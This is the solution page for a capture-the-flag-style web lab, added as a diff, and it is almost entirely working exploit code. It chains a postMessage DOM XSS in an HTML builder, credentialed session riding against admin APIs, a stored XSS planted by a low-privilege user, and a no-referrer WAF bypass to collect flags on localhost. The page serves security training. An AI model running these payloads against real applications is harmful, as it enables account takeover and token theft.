@@ -1,0 +1,401 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer">
+  <title>CampaignHub DOM XSS — Lab PoC (solution)</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; max-width: 1040px; }
+    h1 { font-size: 20px; margin-bottom: 4px; }
+    h2 { font-size: 15px; margin: 18px 0 6px; }
+    .note {
+      background: #fff8e1; border: 1px solid #e0c060;
+      padding: 10px 12px; border-radius: 6px; font-size: 13px;
+      line-height: 1.5;
+    }
+    .row { margin: 10px 0; }
+    button {
+      padding: 9px 14px; font-size: 14px; margin-right: 8px;
+      cursor: pointer;
+    }
+    input {
+      padding: 8px 10px; font-size: 14px; width: 140px;
+      border: 1px solid #ccc; border-radius: 4px;
+    }
+    #log {
+      background: #111; color: #0f0; padding: 12px;
+      min-height: 140px; white-space: pre-wrap;
+      border-radius: 6px; font-family: monospace; font-size: 13px;
+    }
+    .ok { color: #7ee787; font-weight: bold; }
+    .err { color: #ff7b72; font-weight: bold; }
+    iframe {
+      border: 2px solid #333; margin-top: 12px;
+      width: 100%; height: 420px; background: #fff;
+    }
+    code { background: #f0f0f0; padding: 1px 4px; border-radius: 3px; }
+    .flags { margin-top: 8px; font-size: 14px; }
+    .flags span {
+      display: inline-block; background: #e8f5e9;
+      border: 1px solid #a5d6a7; border-radius: 4px;
+      padding: 3px 8px; margin: 3px 6px 0 0; font-family: monospace;
+    }
+  </style>
+</head>
+<body>
+<h1>CampaignHub — postMessage DOM XSS PoC</h1>
+<p class="note">
+  <b>This page is the solution (spoiler).</b> If you have time, close it and
+  try the incomplete PoC on <code>http://localhost:8000</code> yourself;
+  if you want the result immediately, the buttons below collect all three flags.
+  Repo copy: <code>solve/solution_poc.html</code>.
+  It sends an <code>NTM_HTML_BUILDER</code> message with no origin check to
+  <code>http://localhost:8080/html-builder/</code>;
+  <code>view.html</code> is rendered with
+  <code>range.createContextualFragment</code>, so the payload runs in the
+  panel origin.
+  <br>
+  <b>Referer:</b> the page starts with <code>no-referrer</code> — the WAF's
+  cross-site Referer rule never fires.
+  <br>
+  For local lab testing only.
+</p>
+
+<div class="row">
+  <b>Panel:</b>
+  <input id="panelBase" value="http://localhost:8080">
+</div>
+
+<div class="row">
+  <button id="btn1" type="button">1 · flag1 — localStorage (unauthenticated)</button>
+  <button id="btn2" type="button">2 · flag2 — admin login + session riding</button>
+  <button id="btn3" type="button">3 · flag3 — stored XSS (widget preview)</button>
+  <button id="btnAll" type="button"><b>Run all</b></button>
+</div>
+
+<div class="row">
+  admin password: <input id="adminPass" value="Admin!2024" type="password">
+</div>
+
+<h2>Log</h2>
+<pre id="log">Ready.</pre>
+<div class="flags" id="flags"></div>
+
+<iframe id="f" referrerpolicy="no-referrer" title="builder"></iframe>
+
+<script>
+const PANEL = () => document.getElementById('panelBase').value.replace(/\/$/, '');
+const logEl = document.getElementById('log');
+const flagsEl = document.getElementById('flags');
+const f = document.getElementById('f');
+const found = new Set();
+
+function log(s, cls) {
+  const line = cls ? `<span class="${cls}">${s}</span>` : s;
+  logEl.innerHTML += '\n' + line;
+}
+function resetLog(s) {
+  // do not wipe the log during runAll — only append a section header
+  if (window.__runAll) { log(''); log(s); return; }
+  logEl.textContent = s;
+}
+function addFlag(label, value) {
+  if (!value || found.has(value)) return;
+  found.add(value);
+  flagsEl.innerHTML += `<span>${label}: ${value}</span>`;
+  log(`[FLAG] ${label} = ${value}`, 'ok');
+}
+
+window.addEventListener('message', (e) => {
+  const d = e.data;
+  if (typeof d === 'string') {
+    if (d.startsWith('PROOF1|')) {
+      const m = d.match(/key=(FLAG\{[^}]+\})/);
+      if (m) addFlag('flag1', m[1]);
+      log('[proof1] ' + d + '  ← ' + e.origin, 'ok');
+    } else if (d.startsWith('PROOF2|')) {
+      const m = d.match(/token=(FLAG\{[^}]+\})/);
+      if (m) addFlag('flag2', m[1]);
+      log('[proof2] ' + d + '  ← ' + e.origin, 'ok');
+    } else if (d.startsWith('PROOF3|')) {
+      const m = d.match(/token=(FLAG\{[^}]+\})/);
+      if (m) addFlag('flag3', m[1]);
+      log('[proof3] ' + d + '  ← ' + e.origin, 'ok');
+    }
+  } else if (d && d.type === 'NTM_HTML_BUILDER_ACK') {
+    log('[ack] builder replied, frame=' + d.frame);
+  }
+});
+
+/** view.html payload — each stage reads a different place */
+function builderMsg(html, name) {
+  return {
+    type: 'NTM_HTML_BUILDER',
+    initial: true,
+    view: {
+      index: 0,
+      name: name || 'h1-lab-poc',
+      html: html,
+      extJsUrls: [],
+      extCssUrl: [],
+      elements: [],
+      initial: true,
+      // builder contract: without this, render throws
+      containerStyles: {
+        width: '320px',
+        backgroundColor: '#ffffff',
+        border: '1px solid #c00',
+        borderRadius: '5px'
+      }
+    },
+    widgetType: 'FLOATING_BAR',
+    platform: 'WEB'
+  };
+}
+
+function waitLoad(timeoutMs = 6000) {
+  return new Promise((resolve, reject) => {
+    const t0 = Date.now();
+    const tick = () => {
+      if (!f.contentWindow) return;
+      if (f.dataset.loaded === '1') return resolve();
+      if (Date.now() - t0 > timeoutMs) return reject(new Error('iframe load timeout'));
+      setTimeout(tick, 150);
+    };
+    f.onload = () => { f.dataset.loaded = '1'; };
+    tick();
+  });
+}
+
+async function ensureBuilder() {
+  const url = PANEL() + '/html-builder/';
+  if (f.getAttribute('src') !== url) {
+    f.dataset.loaded = '0';
+    f.setAttribute('src', url);
+  } else if (f.dataset.loaded !== '1') {
+    f.dataset.loaded = '0';
+    f.src = url;
+  }
+  await waitLoad();
+  await new Promise(r => setTimeout(r, 400)); // builder script init
+}
+
+async function send(html, name, extraDelay = 0) {
+  const msg = builderMsg(html, name);
+  f.contentWindow.postMessage(msg, '*');
+  log('[send] NTM_HTML_BUILDER → ' + name);
+  if (extraDelay) await new Promise(r => setTimeout(r, extraDelay));
+}
+
+/* ---------- payloads ---------- */
+
+const HTML_STAGE1 = `
+<b id="m1">H1_LAB_MARKER</b>
+<img src=x onerror="(function(){
+  try {
+    var k = localStorage.getItem('campaignhub_app_key');
+    window.parent.postMessage('PROOF1|origin='+location.origin+'|key='+k, '*');
+  } catch (e) {
+    window.parent.postMessage('PROOF1|err='+e, '*');
+  }
+})()">
+`.replace(/\n\s*/g, '');
+
+const HTML_STAGE2 = `
+<b id="m2">SESSION_RIDING</b>
+<img src=x onerror="(function(){
+  fetch('/panel/v2/campaigns', {credentials:'include'})
+    .then(function(r){ return r.json(); })
+    .then(function(j){
+      window.parent.postMessage(
+        'PROOF2|origin='+location.origin+'|token='+(j.export_token||('no-token:'+JSON.stringify(j))),
+        '*');
+    })
+    .catch(function(e){
+      window.parent.postMessage('PROOF2|err='+e, '*');
+    });
+})()">
+`.replace(/\n\s*/g, '');
+
+const HTML_STAGE3 = `
+<b id="m3">STORED_XSS</b>
+<img src=x onerror="(function(){
+  fetch('/panel/v2/audit/log', {credentials:'include'})
+    .then(function(r){ return r.json(); })
+    .then(function(j){
+      var t = j.integrity_token || ('no-token:'+JSON.stringify(j));
+      try { window.opener && window.opener.postMessage('PROOF3|token='+t, '*'); } catch (e) {}
+      console.log('PROOF3|token='+t);
+    })
+    .catch(function(e){
+      console.log('PROOF3|err='+e);
+      try { window.opener && window.opener.postMessage('PROOF3|err='+e, '*'); } catch (e2) {}
+    });
+})()">
+`.replace(/\n\s*/g, '');
+
+/* ---------- stage 1: unauthenticated, localStorage only ---------- */
+async function stage1() {
+  resetLog('Stage 1: unauthenticated builder XSS → localStorage');
+  await ensureBuilder();
+  await send(HTML_STAGE1, 'stage1-localstorage');
+  await new Promise(r => setTimeout(r, 1500));
+  if (![...found].some(x => x.includes('postmessage') || x.startsWith('FLAG'))) {
+    await send(HTML_STAGE1, 'stage1-retry');
+    await new Promise(r => setTimeout(r, 1500));
+  }
+}
+
+async function stage2_login_only() {
+  const pass = document.getElementById('adminPass').value;
+  const r = await fetch(PANEL() + '/login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    credentials: 'include',
+    body: JSON.stringify({ username: 'admin', password: pass })
+  });
+  const j = await r.json();
+  log(j.result ? '[login] ok' : '[login] fail', j.result ? 'ok' : 'err');
+}
+
+/* ---------- stage 2: admin login + credentialed API ---------- */
+async function stage2Full() {
+  resetLog('Stage 2: admin login → session riding');
+  const pass = document.getElementById('adminPass').value;
+  try {
+    const r = await fetch(PANEL() + '/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'include',
+      body: JSON.stringify({ username: 'admin', password: pass })
+    });
+    const j = await r.json();
+    if (!j.result) {
+      log('[login] failed: ' + (j.error || r.status), 'err');
+      return;
+    }
+    log('[login] admin — HttpOnly cookie set (not readable via document.cookie)');
+  } catch (e) {
+    log('[login] ' + e, 'err');
+    return;
+  }
+  await ensureBuilder();
+  await send(HTML_STAGE2, 'stage2-session-riding');
+  await new Promise(r => setTimeout(r, 2000));
+}
+
+/* ---------- stage 3: low-priv saves, admin opens preview ----------
+   Original report hypothesis: a low-privileged user stores HTML;
+   when an admin opens the widget preview the script runs in the
+   panel origin with the admin session. Attacker page is NOT required
+   for execution — preview is opened as a normal panel URL. */
+/* Shell for stage-3 preview. Opened synchronously in the click handler
+   so Chrome still has transient user activation (~5s). Navigating later
+   does not need another gesture. */
+let previewWin = null;
+
+function openPreviewShell() {
+  if (previewWin && !previewWin.closed) return previewWin;
+  previewWin = window.open('about:blank', '_blank');
+  return previewWin;
+}
+
+async function stage3() {
+  resetLog('Stage 3: stored XSS — viewer saves, admin opens preview');
+
+  const pass = document.getElementById('adminPass').value;
+
+  // 1) low-priv session stores the payload (no sanitization on save)
+  try {
+    const lv = await fetch(PANEL() + '/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'include',
+      body: JSON.stringify({ username: 'viewer', password: 'viewer123' })
+    });
+    const lj = await lv.json();
+    if (!lj.result) {
+      log('[login] viewer failed: ' + (lj.error || lv.status), 'err');
+      return;
+    }
+    log('[login] viewer (low privilege) — will Save the widget');
+  } catch (e) {
+    log('[login] viewer ' + e, 'err');
+    return;
+  }
+
+  const save = await fetch(PANEL() + '/panel/widget/save', {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ name: 'lab-poc-stored', html: HTML_STAGE3 })
+  });
+  const sd = await save.json();
+  if (!sd.result) {
+    log('[save] failed: ' + JSON.stringify(sd), 'err');
+    return;
+  }
+  log('[save] widget id=' + sd.id + ' stored as viewer (no sanitization)');
+
+  // 2) admin session — cookie replaced; victim role for the preview
+  try {
+    const av = await fetch(PANEL() + '/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'include',
+      body: JSON.stringify({ username: 'admin', password: pass })
+    });
+    const aj = await av.json();
+    if (!aj.result) {
+      log('[login] admin failed: ' + (aj.error || av.status), 'err');
+      return;
+    }
+    log('[login] admin — will open the widget preview (victim)');
+  } catch (e) {
+    log('[login] admin ' + e, 'err');
+    return;
+  }
+
+  // 3) navigate the shell opened at click time (not a late window.open)
+  const preview = PANEL() + '/panel/widget/preview?id=' + sd.id;
+  log('[open] new tab: ' + preview);
+  if (!previewWin || previewWin.closed) {
+    previewWin = window.open('about:blank', '_blank');
+  }
+  if (!previewWin) {
+    log('[open] popup blocked — open the URL manually: ' + preview, 'err');
+    return;
+  }
+  previewWin.location.href = preview;
+  await new Promise(r => setTimeout(r, 2500));
+}
+
+async function runAll() {
+  window.__runAll = true;
+  resetLog('=== running all stages ===');
+  await stage1();
+  await stage2Full();
+  await stage3();
+  log('\n=== done · flags found: ' + found.size + ' / 3 ===', 'ok');
+  window.__runAll = false;
+}
+
+document.getElementById('btn1').onclick = () => stage1().catch(e => log(String(e), 'err'));
+document.getElementById('btn2').onclick = () => stage2Full().catch(e => log(String(e), 'err'));
+document.getElementById('btn3').onclick = () => {
+  openPreviewShell();
+  stage3().catch(e => log(String(e), 'err'));
+};
+document.getElementById('btnAll').onclick = () => {
+  openPreviewShell(); // must run in the click gesture, before any await
+  runAll().catch(e => log(String(e), 'err'));
+};
+
+// same-site requirement: 127.0.0.1 ≠ localhost (cookies will not flow)
+if (location.hostname === '127.0.0.1') {
+  log('[!] Opened via 127.0.0.1. Use http://localhost:8000/solution_poc.html '
+    + 'to avoid cookie/iframe issues.', 'err');
+}
+</script>
+</body>
+</html>
